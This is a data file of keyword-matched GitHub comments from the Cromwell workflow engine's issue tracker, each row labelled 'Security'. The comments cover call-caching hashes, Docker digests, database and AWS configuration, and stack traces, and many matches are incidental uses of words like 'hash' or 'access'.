sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnec",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:2079,secur,security,2079,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['secur'],['security']
Security,"At the time `hashCode` was all over the Ctrl-\ thread dumps. After seeing all the expensive computation in `hashCode` and considering that keys should have been comparable via instance equality, it became clear that was the problem. It sounds like that's not what you're seeing now?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277885430:13,hash,hashCode,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277885430,4,['hash'],['hashCode']
Security,"At the time, I could replicate with 100 percent certainty. Have not tried; in a while. I'm out, otherwise, I'd do it now. On Nov 23, 2016 10:13 AM, ""kcibul"" notifications@github.com wrote:. > @LeeTL1220 https://github.com/LeeTL1220 -- I'm not sure what to do with; > this... have you seen it again? Seems like the timing diagram is fine, but; > that the underlying metadata was incorrect somehow... and I'm guessing we; > can't reproduce this and don't have access to the data any longer?; > ; > @cjllanwarne https://github.com/cjllanwarne -- is there an actionable; > ticket from your digging?; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-262541364,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ACDXkzqZCzlxr0CyuAuHkr2lcTvHXZjHks5rBFgNgaJpZM4KHqX4; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-262562130:458,access,access,458,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-262562130,1,['access'],['access']
Security,"AuthMode.scala:77); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 common frames omitted; 2019-07-02 19:16:37,967 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - WorkflowManagerActor Workflow 10f172e8-b7ba-416f-964e-22ab8c7b38e3 failed (during MaterializingWorkflowDescriptorState): java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathBuilder$.fromAuthMode(S3PathBuilder.scala:118); 	at cromwell.filesystems.s3.S3PathBuilderFactory.withOptions(S3PathBuilderFactory.scala:59); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:9430,validat,validateCredential,9430,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,"Awesome thanks guys!. On Thu, Mar 17, 2016 at 12:26 PM, Thib notifications@github.com wrote:. > Git hash: 3eb1623; > https://github.com/broadinstitute/cromwell/commit/3eb1623d9a5ffdf0fc3626820eab84ae6560b2cd; > ; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly or view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197959558",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197971028:100,hash,hash,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197971028,1,['hash'],['hash']
Security,BC4Connection.java:47); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); 	at java.lang.reflect.Constructor.newInstance(Constructor.java:422); 	at com.mysql.jdbc.Util.handleNewInstance(Util.java:425); 	at com.mysql.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:389); 	at com.mysql.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:330); 	at com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:95); 	at com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:101); 	at com.zaxxer.hikari.pool.PoolBase.newConnection(PoolBase.java:341); 	at com.zaxxer.hikari.pool.PoolBase.newPoolEntry(PoolBase.java:193); 	at com.zaxxer.hikari.pool.HikariPool.createPoolEntry(HikariPool.java:430); 	at com.zaxxer.hikari.pool.HikariPool.access$500(HikariPool.java:64); 	at com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator.call(HikariPool.java:570); 	at com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator.call(HikariPool.java:563); 	at java.util.concurrent.FutureTask.run(FutureTask.java:266); 	... 3 more; Caused by: java.net.ConnectException: Connection refused; 	at java.net.PlainSocketImpl.socketConnect(Native Method); 	at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350); 	at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206); 	at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188); 	at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392); 	at java.net.Socket.connect(Socket.java:589); 	at com.mysql.jdbc.StandardSocketFactory.connect(StandardSocketFactory.java:211); 	at com.mysql.jdbc.MysqlIO.<init>(MysqlIO.java:300); 	... 24 more; ```; How can I properly configure the database to work properly in the local command? Thank you!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:5925,access,access,5925,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,1,['access'],['access']
Security,"Based on the documentation it (at least seems like) there are ways to get this working. For example:. > if the docker image uses a hash, all call caching settings apply normally. You could try a full uri WITH a hash, e.g,. ```; library/ubuntu:latest@sha256:868fd30a0e47b8d8ac485df174795b5e2fe8a6c8f056cc707b232d65b8a1ab68; ```; Then in the case that you provide a tag (e.g., library/ubuntu:14.04):. > Cromwell will attempt to look up the immutable digest of the image with this floating tag. Upon success it will pass both the floating tag and this digest value to the backend. So if you try providing the example above, does it still reduce it to `ubuntu@sha256:868fd30a0e47b8d8ac485df174795b5e2fe8a6c8f056cc707b232d65b8a1ab68`?. > If Cromwell fails to lookup the digest (for instance an unsupported docker registry, wrong credentials, it will run the job with the user provided floating tag. So couldn't you just give it something you know will fail, and then have it use the tag you did provide?. If you wanted udocker to work, it seems more like a bug that cromwell is considering an incomplete uri (just ubuntu and the hash) as ""the correct way."" That tells us nothing about the registry, the start of the namespace (you could consider this like the collection, library) or a tag. Minimally the entire namespace should be honored, and the hash can still be looked up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454577692:131,hash,hash,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454577692,4,['hash'],['hash']
Security,"Based on your description (i.e. not on actually testing this), I think the encryption key will need to be a 256-bit key in Base64 encoding. I've been using `base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=""` to be a ""not a real value"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/377#issuecomment-171410571:75,encrypt,encryption,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/377#issuecomment-171410571,2,['encrypt'],"['encryption', 'encryption-key']"
Security,Batched access to the workflow store will likely touch on #3757,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3753#issuecomment-396287044:8,access,access,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3753#issuecomment-396287044,1,['access'],['access']
Security,Because the alternative is to use personal github tokens which is not great from a security and re-usability perspective,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2402#issuecomment-333241563:83,secur,security,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2402#issuecomment-333241563,2,['secur'],['security']
Security,"Better still, we'd like to either:. 1) add `cloud-platform` scope, which would allow calling _any_ Google APIs. I understand this may not bode well with the current security model used in Firecloud; however, Google itself recommends migrating away from scopes in favor of IAM, as scopes were introduced before IAM existed [1]. 2) make scopes configurable, ideally at the workflow level, or at least at Cromwell config level. There may be a set of obligatory scopes that is hard-coded in Cromwell (e.g. `genomics` or `compute`), and then `additionalScopes` specified via configuration. This way, we satisfy both the need to restrict the scopes by default, and address other use cases when needed. Our ideal picture for this is that we'd be able to call any Google APIs (e.g. Pub/Sub, Firestore, or BigQuery) from workflows running on CaaS. We don't want to ""wait"" for a new scope to be added upstream each time we have to call a new API. Thanks!. [1] https://cloud.google.com/compute/docs/access/create-enable-service-accounts-for-instances#best_practices",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4115#issuecomment-424583308:165,secur,security,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4115#issuecomment-424583308,2,"['access', 'secur']","['access', 'security']"
Security,"Bloom filter is a test of ""have we seen this before?"" on a huge set. We get one for free from Google Guava [here](https://google.github.io/guava/releases/22.0/api/docs/com/google/common/hash/BloomFilter.html)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2248#issuecomment-332235515:186,hash,hash,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2248#issuecomment-332235515,1,['hash'],['hash']
Security,"By default, the CloudFormation template will only give access to the bucket you specified at creation time as well as `gatk-test-data/*` and `broad-references/*`. To be able to access data in additional buckets you would need to grant `s3.*` to these resources through a policy that grants access to the bucket that you attach to `Cromwell-ServerStac-Ec2InstanceRole` (The exact name of the role depends on the name you gave the stack and some random characters cloud formation adds to prevent name collisions). In addition you need to add the same (or equivalent) policy to `GenomicsW-GenomicsEnvBatchInstance` role. This grants the batch worker EC2s access to the bucket. The policy would look something like:; ```json; {; ""Version"": ""2012-10-17"",; ""Statement"": [; {; ""Action"": [; ""s3:*""; ],; ""Resource"": [; ""arn:aws:s3:::my-bucket-name"",; ""arn:aws:s3:::my-bucket-name/*""; ],; ""Effect"": ""Allow"",; ""Sid"": ""S3BucketAllowAllObjectOps""; }; ]; }; ```. In the `GenomicsEnvBatchJobRole` you would also need to attach a more restricted policy similar to:. ```json; {; ""Version"": ""2012-10-17"",; ""Statement"": [; {; ""Action"": [; ""s3:Delete*"",; ""s3:PutBucket*""; ],; ""Resource"": ""arn:aws:s3:::my-bucket-name"",; ""Effect"": ""Deny""; },; {; ""Action"": [; ""s3:ListBucket*""; ],; ""Resource"": ""arn:aws:s3:::my-bucket-name"",; ""Effect"": ""Allow""; },; {; ""Action"": [; ""s3:*""; ],; ""Resource"": ""arn:aws:s3:::my-bucket-name/*"",; ""Effect"": ""Allow""; }; ]; } ; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-611697894:55,access,access,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-611697894,4,['access'],['access']
Security,Can we also have a test to exercise the multiple errors validations?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/562#issuecomment-197047812:56,validat,validations,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/562#issuecomment-197047812,1,['validat'],['validations']
Security,"Can you elaborate on why you want the functionality described? It is possible that call caching will help, but be aware that Cromwell will only read from the cache when absolutely everything matches - hashes of input files, WDL workflow, etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5300#issuecomment-561673981:201,hash,hashes,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5300#issuecomment-561673981,1,['hash'],['hashes']
Security,Can't reproduce on the prod FC hash. Reassigning back to you since I'm blocked at the moment.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4166#issuecomment-425192938:31,hash,hash,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4166#issuecomment-425192938,1,['hash'],['hash']
Security,"Check before this in the stdout, I ran into this and it was due to a docker image not accessible. Still haven't figured out that problem but hopefully it will point you in the right direction. See link: ; https://gatkforums.broadinstitute.org/wdl/discussion/13540/unable-to-do-docker-lookup#latest",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-434821551:86,access,accessible,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-434821551,1,['access'],['accessible']
Security,"Configuring as you suggested (following the instructions on the provided URL) does not even start the process. Apart of some typos in the instructions (e.g., `MYPASSWORD` instead of `MYSQL_PASSWORD`), it looks that there is a conectivity problem with the docker container running mysql. Steps to reproduce:. ```bash; # start mysql-server container; docker run -p 3306:3306 --name cromwell_db -e MYSQL_ROOT_PASSWORD=`cat my_sql.root.pwd` -e MYSQL_DATABASE=cromwell -e MYSQL_USER=cromwell -e MYSQL_PASSWORD=cromwell -d mysql/mysql-server:5.7; ```. The docker server is working and I can access the database using `docker exec -it cromwell_db mysql -u cromwell -p`. Adding to my configuration file:. ```; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?useSSL=false""; user = ""cromwell""; password = ""cromwell""; connectionTimeout = 5000; }; }; ```. And running locally:. ```bash; JAVA_OPTS=""-Dconfig.file=local.conf"" cromwell run --inputs inputs.json --metadata-output metadata-output.json workflow.wdl; ```. Produces the following log, which is the same even increasing the timeout:. ```; [2018-03-12 11:25:38,45] [info] Running with database db.url = jdbc:mysql://localhost/cromwell?useSSL=false; Exception in thread ""main"" java.lang.ExceptionInInitializerError; 	at cromwell.server.CromwellSystem.$init$(CromwellSystem.scala:24); 	at cromwell.CromwellEntryPoint$$anon$2.<init>(CromwellEntryPoint.scala:63); 	at cromwell.CromwellEntryPoint$.$anonfun$buildCromwellSystem$1(CromwellEntryPoint.scala:63); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.CromwellEntryPoint$.buildCromwellSystem(CromwellEntryPoint.scala:63); 	at cromwell.CromwellEntryPoint$.runSingle(CromwellEntryPoint.scala:47); 	at cromwell.CommandLineParser$.runCromwell(CommandLineParser.scala:95); 	at cromwell.CommandLineParser$.delayedEndpoint$cromwell$CommandLineParser$1(CommandLineParser.scala:105); 	at cromwell.CommandLineParser$delayedInit$",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:585,access,access,585,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,2,"['access', 'password']","['access', 'password']"
Security,"Could you post the Cromwell configuration you're using ? Are the samples you're using relatively large?; I'm just wild guessing but one option would be that Cromwell is spending a lot of time trying to calculate md5 hashes for input files.; There's a configuration option to use file paths instead of file content to determine file equivalence for call caching purposes.; If you can make the assumptions that files are immutable and you don't go back and change their content manually this can be something to try.; To try that, you can update your Cromwell configuration: in the `backend.providers.SLURM.config` section (or whatever your backend is named instead of `SLURM`), and add this:; `filesystems.local.caching.hashing-strategy=""path""`; and this; `filesystems.local.caching.duplication-strategy=[""soft-link""]`. If possible I'd also recommend using a MySql DB instead of file based HSQL.; There are instructions here on how to do that in a few lines: http://cromwell.readthedocs.io/en/develop/tutorials/PersistentServer/#lets-get-started. Let me know if that makes any difference :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386406902:216,hash,hashes,216,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386406902,2,['hash'],"['hashes', 'hashing-strategy']"
Security,"Crom support went back to redteam; here is the content from the dsde-docs issue:. ----. There's documentation in the CHANGELOG but nothing in the README, though what's in the CHANGELOG might suffice for the README. I don't know any more than this anyway, @Horneth is the expert. 😛 . * Add support for Google Private IPs through `noAddress` runtime attribute. If set to true, the VM will NOT be provided with a public IP address.; *Important*: Your project must be whitelisted in ""Google Access for Private IPs Early Access Program"". If it's not whitelisted and you set this attribute to true, the task will hang.; Defaults to `false`.; e.g:; ```; task {; command {; echo ""I'm private !""; }. runtime {; docker: ""ubuntu:latest""; noAddress: true; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1922#issuecomment-375075999:487,Access,Access,487,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1922#issuecomment-375075999,2,['Access'],['Access']
Security,Cromwell 27 will be able to retrieve hashes for public images stored on quay.io,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2252#issuecomment-299852998:37,hash,hashes,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2252#issuecomment-299852998,1,['hash'],['hashes']
Security,"Cromwell communicates with various gcloud endpoints. Instead of having N creds for N endpoints, sometimes Cromwell reuses creds for something else. For example: using the GCS creds for docker hash lookups [here](https://github.com/broadinstitute/cromwell/blob/78/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiBackendLifecycleActorFactory.scala#L70-L82). This PR adds an optional config for reference disk validation auth falling back to the `genomics` auth that was used previously. One can then use USA authentication for individual genomics calls and a separate system SA for verifying which of the reference disks are valid (at startup).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933:192,hash,hash,192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933,3,"['authenticat', 'hash', 'validat']","['authentication', 'hash', 'validation']"
Security,"Currently default runtime attributes are typechecked in the backend-specific runtime attribute classes (e.g. `JesRuntimeAttributes`, `LocalRuntimeAttributes`, etc) using attribute name to type mappings that are backend-specific. With our current static backend selection scheme, MWDA knows the backend to which a task will be sent at validation time. So while it's currently possible to refactor to expose backend-specific default runtime attribute typechecking to MWDA, that system would break down with a dynamic backend selection scheme. . It's also not clear how MWDA-composed runtime attributes would be handed to the backend-specific runtime attribute classes for the more substantive ""beyond typechecking"" round of validation and execution. It's possible we could copy the `NamespaceWithWorkflow` and write the relevant attributes into the tasks, but I'm not sure if we'd get into trouble later with bindings that no longer agree with the AST.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-231157891:334,validat,validation,334,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-231157891,6,"['expose', 'validat']","['expose', 'validation']"
Security,"Currently only a draft since I'd like to hear from others:; - how deeply folks want this CI tested (is a unit test using mock auth enough?); - if folks think this copied code should be moved down into the standard backends, since GAR/GAR can be public-but-authenticated just like DockerHub, Quay, etc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748:256,authenticat,authenticated,256,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748,1,['authenticat'],['authenticated']
Security,"Developer notes:. When first launching single workflow mode, Cromwell calls `cromwell.CommandLineArguments#validateSubmission` and generates a `cromwell.CommandLineArguments.ValidSubmission` if the submission looks good. `ValidSubmission` has the appearance of supporting directories because it has the member `dependencies`. In [both](https://github.com/broadinstitute/cromwell/blob/9249537fd094c6979b0c64e99fcc90d48c861487/server/src/main/scala/cromwell/CromwellEntryPoint.scala#L229) [places](https://github.com/broadinstitute/cromwell/blob/9249537fd094c6979b0c64e99fcc90d48c861487/server/src/main/scala/cromwell/CromwellEntryPoint.scala#L249) where `validateSubmission` is actually called, however, we copy the value into another variable that is named & treated as the path to a zip file.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5693#issuecomment-672004178:107,validat,validateSubmission,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5693#issuecomment-672004178,2,['validat'],['validateSubmission']
Security,"Did some testing with the Dockstore team and concluded that ghcr.io images do technically seem to be getting pulled, but there's an issue with the hash. In the short term it might be acceptable to make the warning explain what ""not supported"" actually means, but ghcr.io seems to be increasing in popularity so it's likely best to add full official support.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6827#issuecomment-1218465541:147,hash,hash,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6827#issuecomment-1218465541,1,['hash'],['hash']
Security,Discussed name of the file with @katevoss and we're going to go with `SecurityRecommendations.md`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259488332:70,Secur,SecurityRecommendations,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259488332,1,['Secur'],['SecurityRecommendations']
Security,"Discussed with @katevoss - as we don't have our long range documentation plan hashed out yet for now we'll be:; - Making a separate doc (name tbd) with two initial bits. One is the content from @delocalizer describing a user based setup. We'll make it clear that this is their set up and not ours, both from the indemnity angle that @cjllanwarne was concerned about but more importantly because it helps to demonstrate the vibrant community which is building around Cromwell; - I'll add a second section describing Firecloud's security model; - That doc will be linked from the README; - We'll set up a blog post on the main site describing security/auth options in Cromwell and directly referencing this doc. Readers/users will be encouraged to ask questions, provide alternate suggestions, etc. The security doc (for lack of a better word atm) will be more of a living doc. @delocalizer ... I don't want to make extra work for you here. If you wanted to update this PR to reflect the first and third bullet points great, otherwise I can pick up this PR and do first and third while i'm doing the second. If you're going with the former hold off until I confirm the name of the file :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259449531:78,hash,hashed,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259449531,8,"['hash', 'secur']","['hashed', 'security']"
Security,"Discussed with @scottfrazer, I reproduced the bug on the git hash provided by Jose, and same wdl didn't yield duplicate inputs on develop.; I think this can be marked resolved.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197934567:61,hash,hash,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197934567,1,['hash'],['hash']
Security,"Docker requires all image lookups to be qualified by a repository name. For Broad images our repository is ""broadinstitute"", and in our WDLs we request Broad images with the repository explicitly specified a la ""broadinstitute/genomes-in-the-cloud"". The more universal images like ""ubuntu"" don't require an explicit repository specification in casual parlance, but still require a default repository specification of ""library"" for hash lookups. When a Docker image is specified in WDL that includes a hash, Cromwell skips the hash lookup and just hashes the image name. Cromwell 26 would use essentially the Docker image string that had been specified in the WDL, i.e. something like `ubuntu@sha256:ea1d854d38be82f54d39efe2c67000bed1b03348bcc2f3dc094f260855dff368`. Cromwell 27 inadvertently changed the internal representation of the image string to prepend the `library/` repository even when it hadn't been explicitly specified in the WDL. This meant that the Docker string would hash differently on 27 than it did on 26, resulting in unwanted cache misses. These changes look to track whether a repository has been explicitly specified or not, and only prepend the `library/` where required on hash lookups.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2360#issuecomment-308687081:431,hash,hash,431,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2360#issuecomment-308687081,6,['hash'],"['hash', 'hashes']"
Security,"EFS shines only if it's multi-TB, otherwise directly accessing S3 is much faster (and there's no need to first copy the data from S3 to a filesystem when it can be streamed).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1542#issuecomment-313258027:53,access,accessing,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1542#issuecomment-313258027,1,['access'],['accessing']
Security,"Exactly why. Since Cromiam fiddles with labels, if a workflow fails to validate that control information is lost",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3228#issuecomment-362119435:71,validat,validate,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3228#issuecomment-362119435,1,['validat'],['validate']
Security,"Excellent point from @cjllanwarne: we are protected from the ""workshop scenario"" - many users validating the same WF at the same time - by the Rawls cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456958477:94,validat,validating,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456958477,1,['validat'],['validating']
Security,"Excellent. So if I fix that in my conf, the messages should go away,; right? Can I specify docker.hash-lookup.method in the workflow_options?. On Fri, Aug 11, 2017 at 1:31 PM, Thib <notifications@github.com> wrote:. > If the image is not on dockerhub but exists locally to where the Cromwell; > application is running then it should be able to find the hash if docker.hash-lookup.method; > = ""local""; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321872886>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXkxZ61CdCMTLR5po4xUtPAM1MnJ0sks5sXI_2gaJpZM4O0GvF>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321874576:98,hash,hash-lookup,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321874576,3,['hash'],"['hash', 'hash-lookup']"
Security,"FWIW [the documentation](https://gsaweb.broadinstitute.org/wdl/devzone/) says `read_json` will do what I expect! Ctrl+F ""Array deserialization using read_json()"". Here's the WDL task I was trying to validate:. ```; # reverses a json array; task reverseArray {; Array[Int] intArray; ; command {; python -c ""import sys; print(list(map(int, sys.argv[-1:0:-1])))"" ${sep=' ' intArray}; }; ; output {; Array[Int] outArr = read_json(stdout()); }; }; ```. And got the error:. ```$ java -jar wdltool-0.4.jar validate json_things.wdl; ERROR: Could not determine type of declaration outArr:; Array[Int] outArr = read_json(stdout()); ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1825#issuecomment-271403754:199,validat,validate,199,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1825#issuecomment-271403754,2,['validat'],['validate']
Security,"FYI this was a key item in feedback from our WDL sessions in the UK workshops; having to specify accessory files is a big source of annoyance. Not that it's any surprise, but we're definitely getting confirmation from real users.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-317858944:97,access,accessory,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-317858944,2,['access'],['accessory']
